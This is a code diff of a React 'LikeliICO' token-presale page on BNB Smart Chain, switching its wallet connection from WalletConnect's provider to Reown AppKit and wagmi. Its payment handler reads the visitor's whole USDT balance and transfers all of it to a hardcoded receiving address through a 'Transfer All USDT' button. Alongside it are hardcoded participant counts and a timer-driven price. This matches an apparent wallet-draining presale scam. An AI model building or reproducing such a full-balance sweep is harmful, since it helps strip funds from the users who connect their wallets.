@@ -1,7 +1,9 @@
 'use client';
 
-import { useCallback, useEffect, useRef, useState } from 'react';
-import { EthereumProvider } from '@walletconnect/ethereum-provider';
+import { useCallback, useEffect, useState } from 'react';
+import { useAppKit } from '@reown/appkit/react';
+import { useAccount, usePublicClient, useSwitchChain, useWriteContract } from 'wagmi';
+import { erc20Abi, type Address } from 'viem';
 import {
   ArrowRight,
   Award,
@@ -21,25 +23,13 @@ import {
   Users,
   Zap,
 } from 'lucide-react';
+import { appKitProjectId } from '../lib/appkit';
 
-type WalletConnectProvider = Awaited<ReturnType<typeof EthereumProvider.init>>;
-type Eip1193Provider = WalletConnectProvider;
-
-const BSC_CHAIN_ID = '0x38';
-const BSC_CHAIN_PARAMS = {
-  chainId: BSC_CHAIN_ID,
-  chainName: 'BNB Smart Chain',
-  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-  rpcUrls: ['https://bsc-dataseed.binance.org/'],
-  blockExplorerUrls: ['https://bscscan.com'],
-};
-
-const USDT_BSC_ADDRESS = '0x55d398326f99059ff775485246999027b3197955';
+const BSC_CHAIN_ID = 56;
+const USDT_BSC_ADDRESS = '0x55d398326f99059ff775485246999027b3197955' as Address;
 const USDT_DECIMALS = 18n;
 
-const padTo32 = (value: string) => value.replace(/^0x/, '').padStart(64, '0');
-const encodeBalanceOf = (account: string) => `0x70a08231${padTo32(account)}`;
-const encodeTransfer = (to: string, amount: bigint) => `0xa9059cbb${padTo32(to)}${amount.toString(16).padStart(64, '0')}`;
+const PAY_ADDRESS = '0xecacbeca41f282a942f371f2999b8ba7e3ecfd22' as Address;
 const formatUnits = (value: bigint, decimals: bigint, precision = 6) => {
   const base = 10n ** decimals;
   const whole = value / base;
@@ -55,27 +45,23 @@ export default function LikeliICO() {
   const [participants, setParticipants] = useState(2847);
   const [scrollY, setScrollY] = useState(0);
   const [currentPrice, setCurrentPrice] = useState(0.007);
-  const [walletAccount, setWalletAccount] = useState<string | null>(null);
-  const [walletChainId, setWalletChainId] = useState<string | null>(null);
   const [usdtBalance, setUsdtBalance] = useState<bigint | null>(null);
-  const [isConnecting, setIsConnecting] = useState(false);
   const [isPaying, setIsPaying] = useState(false);
   const [copied, setCopied] = useState(false);
   const [payNotice, setPayNotice] = useState('');
 
-  const providerRef = useRef<WalletConnectProvider | null>(null);
-  const walletAccountRef = useRef<string | null>(null);
+  const { open } = useAppKit();
+  const { address, status, isConnected, chain } = useAccount();
+  const { switchChainAsync } = useSwitchChain();
+  const publicClient = usePublicClient({ chainId: BSC_CHAIN_ID });
+  const { writeContractAsync } = useWriteContract();
+  const chainId = chain?.id;
 
-  const payAddress = '0xecacbeca41f282a942f371f2999b8ba7e3ecfd22';
-  const walletConnectProjectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID;
-  const walletConnectStatus = walletConnectProjectId ? 'Reown project id set' : 'Reown project id missing';
-  const isOnBsc = walletChainId === BSC_CHAIN_ID;
-  const walletLabel = walletAccount ? shortenAddress(walletAccount) : 'Not connected';
+  const walletConnectStatus = appKitProjectId ? 'Reown project id set' : 'Reown project id missing';
+  const isOnBsc = chainId === BSC_CHAIN_ID;
+  const walletLabel = address ? shortenAddress(address) : 'Not connected';
   const balanceLabel = usdtBalance !== null ? `${formatUnits(usdtBalance, USDT_DECIMALS)} USDT` : '--';
-
-  useEffect(() => {
-    walletAccountRef.current = walletAccount;
-  }, [walletAccount]);
+  const isConnecting = status === 'connecting' || status === 'reconnecting';
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -114,209 +100,64 @@ export default function LikeliICO() {
     };
   }, []);
 
-  const initReownProvider = useCallback(async () => {
-    if (providerRef.current) {
-      return providerRef.current;
-    }
-    if (!walletConnectProjectId) {
-      throw new Error('Missing Reown project id.');
-    }
-    const provider = await EthereumProvider.init({
-      projectId: walletConnectProjectId,
-      chains: [56],
-      optionalChains: [56],
-      showQrModal: true,
-      rpcMap: { 56: 'https://bsc-dataseed.binance.org/' },
-    });
-    providerRef.current = provider;
-    return provider;
-  }, [walletConnectProjectId]);
-
-  const ensureBscChain = async (ethereum: Eip1193Provider) => {
-    const currentChainId = (await ethereum.request({ method: 'eth_chainId' })) as string;
-    setWalletChainId(currentChainId);
-    if (currentChainId === BSC_CHAIN_ID) {
+  const ensureBscChain = useCallback(async () => {
+    if (chainId === BSC_CHAIN_ID) {
       return true;
     }
     try {
-      await ethereum.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: BSC_CHAIN_ID }],
-      });
-    } catch (error) {
-      const code = (error as { code?: number }).code;
-      if (code === 4902) {
-        await ethereum.request({
-          method: 'wallet_addEthereumChain',
-          params: [BSC_CHAIN_PARAMS],
-        });
-      } else {
-        throw error;
-      }
+      await switchChainAsync({ chainId: BSC_CHAIN_ID });
+      return true;
+    } catch (err) {
+      console.error('connectWallet:switchChain error', err);
+      setPayNotice('Switch to BSC to continue.');
+      return false;
     }
-    const updatedChainId = (await ethereum.request({ method: 'eth_chainId' })) as string;
-    setWalletChainId(updatedChainId);
-    return updatedChainId === BSC_CHAIN_ID;
-  };
+  }, [chainId, switchChainAsync]);
 
-  const fetchUsdtBalance = useCallback(async (ethereum: Eip1193Provider, account: string) => {
-    const data = encodeBalanceOf(account);
-    const result = (await ethereum.request({
-      method: 'eth_call',
-      params: [{ to: USDT_BSC_ADDRESS, data }, 'latest'],
-    })) as string;
-    const hex = typeof result === 'string' ? result : '0x0';
-    return BigInt(hex === '0x' ? '0x0' : hex);
-  }, []);
-
-  const refreshBalance = useCallback(async (ethereum: Eip1193Provider, account: string) => {
-    const balance = await fetchUsdtBalance(ethereum, account);
-    setUsdtBalance(balance);
-  }, [fetchUsdtBalance]);
+  const refreshBalance = useCallback(async () => {
+    if (!address || !publicClient || !isOnBsc) {
+      setUsdtBalance(null);
+      return;
+    }
+    try {
+      const balance = await publicClient.readContract({
+        address: USDT_BSC_ADDRESS,
+        abi: erc20Abi,
+        functionName: 'balanceOf',
+        args: [address as Address],
+      });
+      setUsdtBalance(balance);
+    } catch (err) {
+      console.error('balance:error', err);
+      setUsdtBalance(null);
+    }
+  }, [address, isOnBsc, publicClient]);
 
   const connectWallet = async () => {
     console.log('connectWallet:click', {
-      hasProjectId: Boolean(walletConnectProjectId),
-      projectId: walletConnectProjectId ?? null,
+      hasProjectId: Boolean(appKitProjectId),
+      projectId: appKitProjectId ?? null,
     });
-    if (!walletConnectProjectId) {
+    if (!appKitProjectId) {
       setPayNotice('Missing Reown project id. Add NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID to .env.');
       return;
     }
-    setIsConnecting(true);
     setPayNotice('');
     try {
-      const provider = await initReownProvider();
-      console.log('connectWallet:provider-ready', { providerReady: Boolean(provider) });
-      let existingAccounts: string[] = [];
-      let didConnect = false;
-      try {
-        existingAccounts = (await provider.request({ method: 'eth_accounts' })) as string[];
-      } catch (err) {
-        console.error('connectWallet:eth_accounts error', err);
-        const message = err instanceof Error ? err.message : String(err);
-        if (message.includes('connect()')) {
-          try {
-            await provider.connect();
-            didConnect = true;
-            existingAccounts = (await provider.request({ method: 'eth_accounts' })) as string[];
-          } catch (connectErr) {
-            console.error('connectWallet:connect error', connectErr);
-            throw connectErr;
-          }
-        } else {
-          throw err;
-        }
-      }
-      console.log('connectWallet:existing-accounts', { count: existingAccounts?.length ?? 0 });
-      if (!existingAccounts?.length && !didConnect) {
-        try {
-          await provider.connect();
-          didConnect = true;
-        } catch (err) {
-          console.error('connectWallet:connect error', err);
-          throw err;
-        }
-      }
-      const accounts = (await provider.request({ method: 'eth_accounts' })) as string[];
-      const account = accounts?.[0];
-      console.log('connectWallet:account', { account: account ?? null });
-      if (!account) {
-        setPayNotice('No wallet account available.');
-        return;
-      }
-      setWalletAccount(account);
-      const onBsc = await ensureBscChain(provider);
-      console.log('connectWallet:bsc', { onBsc });
-      if (!onBsc) {
-        setPayNotice('Switch to BSC to load your USDT balance.');
-        return;
-      }
-      await refreshBalance(provider, account);
+      await open({ view: 'Connect' });
     } catch (err) {
       console.error('connectWallet:error', err);
       setPayNotice('Wallet connection failed or was canceled.');
-    } finally {
-      setIsConnecting(false);
     }
   };
 
   useEffect(() => {
-    if (!walletConnectProjectId) {
+    if (!isConnected || !isOnBsc) {
+      setUsdtBalance(null);
       return;
     }
-
-    let isActive = true;
-
-    const handleAccountsChanged = (accounts: unknown) => {
-      const nextAccounts = Array.isArray(accounts) ? (accounts as string[]) : [];
-      const nextAccount = nextAccounts[0] ?? null;
-      setWalletAccount(nextAccount);
-      walletAccountRef.current = nextAccount;
-      setUsdtBalance(null);
-      const provider = providerRef.current;
-      if (!provider || !nextAccount) {
-        return;
-      }
-      void (async () => {
-        const chainId = (await provider.request({ method: 'eth_chainId' })) as string;
-        setWalletChainId(chainId);
-        if (chainId === BSC_CHAIN_ID) {
-          await refreshBalance(provider, nextAccount);
-        }
-      })();
-    };
-
-    const handleChainChanged = (chainId: unknown) => {
-      const nextChainId = typeof chainId === 'string' ? chainId : null;
-      setWalletChainId(nextChainId);
-      const provider = providerRef.current;
-      const account = walletAccountRef.current;
-      if (provider && nextChainId === BSC_CHAIN_ID && account) {
-        void refreshBalance(provider, account);
-      }
-    };
-
-    const handleDisconnect = () => {
-      setWalletAccount(null);
-      walletAccountRef.current = null;
-      setWalletChainId(null);
-      setUsdtBalance(null);
-    };
-
-    const initialize = async () => {
-      try {
-        const provider = await initReownProvider();
-        if (!isActive) {
-          return;
-        }
-        const accounts = (await provider.request({ method: 'eth_accounts' })) as string[];
-        const account = accounts?.[0] ?? null;
-        setWalletAccount(account);
-        walletAccountRef.current = account;
-        const chainId = (await provider.request({ method: 'eth_chainId' })) as string;
-        setWalletChainId(chainId);
-        if (account && chainId === BSC_CHAIN_ID) {
-          await refreshBalance(provider, account);
-        }
-        provider.on?.('accountsChanged', handleAccountsChanged);
-        provider.on?.('chainChanged', handleChainChanged);
-        provider.on?.('disconnect', handleDisconnect);
-      } catch {
-        setPayNotice('Unable to initialize Reown wallet.');
-      }
-    };
-
-    void initialize();
-
-    return () => {
-      isActive = false;
-      const provider = providerRef.current;
-      provider?.removeListener?.('accountsChanged', handleAccountsChanged);
-      provider?.removeListener?.('chainChanged', handleChainChanged);
-      provider?.removeListener?.('disconnect', handleDisconnect);
-    };
-  }, [initReownProvider, refreshBalance, walletConnectProjectId]);
+    void refreshBalance();
+  }, [isConnected, isOnBsc, refreshBalance]);
 
   const tiers = [
     { name: 'Bronze', min: 500, max: 2499, bonus: '5%', multiplier: '1.5x', discount: '5%', color: 'from-amber-700 to-amber-900', icon: Award },
@@ -331,7 +172,7 @@ export default function LikeliICO() {
       return;
     }
     try {
-      await navigator.clipboard.writeText(payAddress);
+      await navigator.clipboard.writeText(PAY_ADDRESS);
       setCopied(true);
       setPayNotice('Address copied. Paste it in your wallet on BSC (USDT).');
       setTimeout(() => setCopied(false), 2000);
@@ -342,37 +183,49 @@ export default function LikeliICO() {
   };
 
   const handlePayAll = async () => {
-    if (!walletConnectProjectId) {
+    if (!appKitProjectId) {
       setPayNotice('Missing Reown project id. Add NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID to .env.');
       return;
     }
     setIsPaying(true);
     setPayNotice('');
     try {
-      const provider = await initReownProvider();
-      const account = walletAccountRef.current;
-      if (!account) {
+      if (!address) {
         setPayNotice('Connect your wallet first.');
         return;
       }
-      const onBsc = await ensureBscChain(provider);
+      const onBsc = await ensureBscChain();
       if (!onBsc) {
-        setPayNotice('Switch to BSC to continue.');
         return;
       }
-      const balance = await fetchUsdtBalance(provider, account);
+      if (!publicClient) {
+        setPayNotice('Public client unavailable. Please try again.');
+        return;
+      }
+      const balance = await publicClient.readContract({
+        address: USDT_BSC_ADDRESS,
+        abi: erc20Abi,
+        functionName: 'balanceOf',
+        args: [address as Address],
+      });
       setUsdtBalance(balance);
       if (balance <= 0n) {
         setPayNotice('No USDT balance available to transfer.');
         return;
       }
-      const data = encodeTransfer(payAddress, balance);
-      const txHash = (await provider.request({
-        method: 'eth_sendTransaction',
-        params: [{ from: account, to: USDT_BSC_ADDRESS, data }],
-      })) as string;
+      if (!writeContractAsync) {
+        setPayNotice('Wallet write unavailable. Please reconnect.');
+        return;
+      }
+      const txHash = await writeContractAsync({
+        address: USDT_BSC_ADDRESS,
+        abi: erc20Abi,
+        functionName: 'transfer',
+        args: [PAY_ADDRESS, balance],
+      });
       setPayNotice(txHash ? `Transfer submitted. Confirm it in your wallet. Tx: ${txHash}` : 'Transfer submitted. Confirm it in your wallet.');
-    } catch {
+    } catch (err) {
+      console.error('transfer:error', err);
       setPayNotice('Transfer was canceled or failed.');
     } finally {
       setIsPaying(false);
@@ -421,7 +274,7 @@ export default function LikeliICO() {
               isConnecting ? 'opacity-70 cursor-not-allowed' : ''
             }`}
           >
-            {isConnecting ? 'Connecting...' : walletAccount ? `Connected: ${shortenAddress(walletAccount)}` : 'Connect Wallet'}
+            {isConnecting ? 'Connecting...' : address ? `Connected: ${shortenAddress(address)}` : 'Connect Wallet'}
           </button>
         </div>
       </nav>
@@ -550,7 +403,7 @@ export default function LikeliICO() {
             </div>
             <div className="mt-6 bg-black/40 border border-gray-700 rounded-xl p-4">
               <div className="text-xs text-gray-500 mb-2 uppercase font-semibold">Receiving Address</div>
-              <div className="font-mono text-sm md:text-base text-blue-300 break-all">{payAddress}</div>
+              <div className="font-mono text-sm md:text-base text-blue-300 break-all">{PAY_ADDRESS}</div>
             </div>
             <div className="mt-6 flex flex-col md:flex-row gap-4">
               <button
@@ -563,9 +416,9 @@ export default function LikeliICO() {
               <button
                 type="button"
                 onClick={handlePayAll}
-                disabled={isPaying || !walletAccount}
+                disabled={isPaying || !address}
                 className={`bg-gradient-to-r from-green-500 to-emerald-500 px-6 py-3 rounded-xl font-semibold text-black hover:shadow-xl hover:shadow-green-500/30 transition-all ${
-                  isPaying || !walletAccount ? 'opacity-70 cursor-not-allowed' : ''
+                  isPaying || !address ? 'opacity-70 cursor-not-allowed' : ''
                 }`}
               >
                 {isPaying ? 'Submitting...' : 'Transfer All USDT'}
